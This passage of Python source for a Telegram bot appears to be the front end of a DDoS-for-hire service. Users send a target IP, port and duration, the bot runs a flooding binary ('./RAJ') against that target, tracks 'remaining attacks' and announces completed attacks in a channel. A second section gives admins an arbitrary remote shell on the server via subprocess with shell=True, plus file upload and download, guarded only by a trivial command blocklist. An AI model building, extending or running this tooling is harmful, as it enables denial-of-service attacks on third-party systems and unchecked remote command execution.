    f"🎖 **𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗔𝗧𝗧𝗔𝗖𝗞𝗦:** `{remaining_attacks} / 15`\n"
    f"⚠️ **𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗔𝗙𝗧𝗘𝗥 𝗚𝗔𝗠𝗘!** ⚠️\n"
)


        # Log the attack started message
        logging.info(f"Attack started by {user_name}: ./RAJ {target_ip} {target_port} {default_duration}")

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), user_duration, message.chat.id, message.from_user.username if message.from_user.username else message.from_user.first_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))
        attack_running = False

async def run_attack_command_async(target_ip, target_port, user_duration, chat_id, username):
    global attack_running
    try:
        command = f"./RAJ {target_ip} {target_port} {user_duration}"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(
    CHANNEL_ID,
    f"┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    f"┃ ✅ **𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗!** ✅ ┃\n"
    f"┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
    f"📌 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗡𝗙𝗢:**\n"
    f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
    f"┃ 🎯 **𝗧𝗔𝗥𝗚𝗘𝗧:**   `{target_ip}`\n"
    f"┃ 🚪 **𝗣𝗢𝗥𝗧:**   `{target_port}`\n"
    f"┃ ⏳ **𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{user_duration} sec`\n"
    f"┗━━━━━━━━━━━━━━━━━━━━┛\n\n"
    f"🚀 **𝗘𝗫𝗘𝗖𝗨𝗧𝗘𝗗 𝗕𝗬:** @{username}"
)
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")

    finally:
        attack_running = False

# --------------------------------------------------------------
        

        
        
        
# --------------------[ TERMINAL SECTION ]----------------------

import os
import subprocess
import threading
import time
from telebot import types

# ✅ **List of Blocked Commands**
BLOCKED_COMMANDS = ["nano", "sudo", "rm", "rm -rf", "screen"]

# ✅ **Admin ID List (Yahan Apna Real Telegram ID Daal!)**
ADMIN_IDS = [7479349647]  # ✅ **Integer format me rakhna, string mat bana!**

# ✅ **Terminal Menu Command**
@bot.message_handler(func=lambda message: message.text == "VPS")
def VPS_menu(message):
    """Show the VPS menu for admins."""
    user_id = message.chat.id  # ✅ Don't convert to string!

    if user_id in ADMIN_IDS:  # ✅ Use correct admin list
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        command_button = types.KeyboardButton("Command")
        upload_button = types.KeyboardButton("Upload")
        download_button = types.KeyboardButton("Download")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(command_button, upload_button, download_button, back_button)

        bot.reply_to(message, "⚙️ RAJ 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗟 𝗠𝗘𝗡𝗨", reply_markup=markup)
    else:
        bot.reply_to(message, "⛔️ **You are not an admin.**", parse_mode="Markdown")


# ✅ **Command Execution in VPS**
@bot.message_handler(func=lambda message: message.text == "Command")
def command_to_VPS(message):
    user_id = message.chat.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "💻 **𝗘𝗻𝘁𝗲𝗿 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:**", parse_mode="Markdown")
        bot.register_next_step_handler(message, execute_VPS_command)
    else:
        bot.reply_to(message, "⛔ **𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.**", parse_mode="Markdown")

def execute_VPS_command(message):
    try:
        command = message.text.strip()
        
        # ✅ **Check for Blocked Commands**
        if any(command.startswith(block) for block in BLOCKED_COMMANDS):
            bot.reply_to(message, "❗ **𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱!** 🚫", parse_mode="Markdown")
            return
        
        # ✅ **Execute Command in VPS**
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr

        bot.reply_to(message, f"✅ **𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗘𝘅𝗲𝗰𝘂𝘁𝗲𝗱:**\n```{output}```", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❗ **𝗘𝗿𝗿𝗼𝗿:** `{str(e)}`", parse_mode="Markdown")

# ✅ **Upload System with Animation**
@bot.message_handler(func=lambda message: message.text == "Upload")
def upload_to_VPS(message):
    user_id = message.chat.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "📤 **𝗦𝗲𝗻𝗱 𝗔 𝗙𝗶𝗹𝗲 𝗧𝗼 𝗨𝗽𝗹𝗼𝗮𝗱:**", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_file_upload)
    else:
        bot.reply_to(message, "⛔ **𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.**", parse_mode="Markdown")

def upload_animation(chat_id, message_id, stop_event):
    dots = [".", "..", "..."]
    i = 0
    while not stop_event.is_set():  
        try:
            bot.edit_message_text(f"📤 **𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴{dots[i]}**", chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
            i = (i + 1) % len(dots)
            time.sleep(0.3)
        except:
            pass

def process_file_upload(message):
    if message.document:
        try:
            upload_msg = bot.reply_to(message, "📤 **𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴**", parse_mode="Markdown")
            stop_event = threading.Event()
            animation_thread = threading.Thread(target=upload_animation, args=(message.chat.id, upload_msg.message_id, stop_event))
            animation_thread.start()

            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            file_path = os.path.join(os.getcwd(), message.document.file_name)
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            stop_event.set()
            animation_thread.join()

            bot.edit_message_text(f"✅ **𝗙𝗶𝗹𝗲 𝗨𝗽𝗹𝗼𝗮𝗱𝗲𝗱:** `{file_path}`", chat_id=message.chat.id, message_id=upload_msg.message_id, parse_mode="Markdown")

        except Exception as e:
            stop_event.set()
            bot.reply_to(message, f"❗ **𝗘𝗿𝗿𝗼𝗿 𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗙𝗶𝗹𝗲:** `{str(e)}`", parse_mode="Markdown")

# ✅ **File Download System with Animated Progress**
@bot.message_handler(func=lambda message: message.text == "Download")
def list_files(message):
    user_id = message.chat.id
    if user_id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "⛔ **𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.**", parse_mode="Markdown")
        return

    files = [f for f in os.listdir() if os.path.isfile(f) and not f.startswith(".")]

    if not files:
        bot.send_message(message.chat.id, "📁 **𝗡𝗼 𝗙𝗶𝗹𝗲𝘀 𝗜𝗻 𝗩𝗣𝗦.**", parse_mode="Markdown")
        return

    markup = types.InlineKeyboardMarkup()
    for file in files:
        markup.add(types.InlineKeyboardButton(file, callback_data=f"download_{file}"))
    
    markup.add(types.InlineKeyboardButton("⭕ Cancel", callback_data="cancel_download"))
    bot.send_message(message.chat.id, "📂 **𝗦𝗲𝗹𝗲𝗰𝘁 𝗙𝗶𝗹𝗲 𝗧𝗼 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱:**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("download_"))
def send_file(call):
    user_id = call.message.chat.id
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "⛔ **𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱.**")
        return

    filename = call.data.replace("download_", "")
    if not os.path.exists(filename):
        bot.answer_callback_query(call.id, "❌ **𝗙𝗶𝗹𝗲 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱.**")
        return

    with open(filename, "rb") as file:
        bot.send_document(call.message.chat.id, file)

    bot.answer_callback_query(call.id, "✅ **𝗙𝗶𝗹𝗲 𝗦𝗲𝗻𝘁!**")

@bot.callback_query_handler(func=lambda call: call.data == "cancel_download")
def cancel_download(call):
    bot.edit_message_text("❗ **𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "<< Back to Menu")
def back_to_main_menu(message):
    """Go back to the main menu."""
    user_id = message.chat.id
    if user_id in ADMIN_IDS:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.add("VPS")  # ✅ **Main Menu Buttons**
        bot.reply_to(message, "🔙 **Back to Main Menu!**", reply_markup=markup, parse_mode="Markdown")
    else:
        bot.reply_to(message, "⛔ **You are not an admin.**", parse_mode="Markdown")



# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
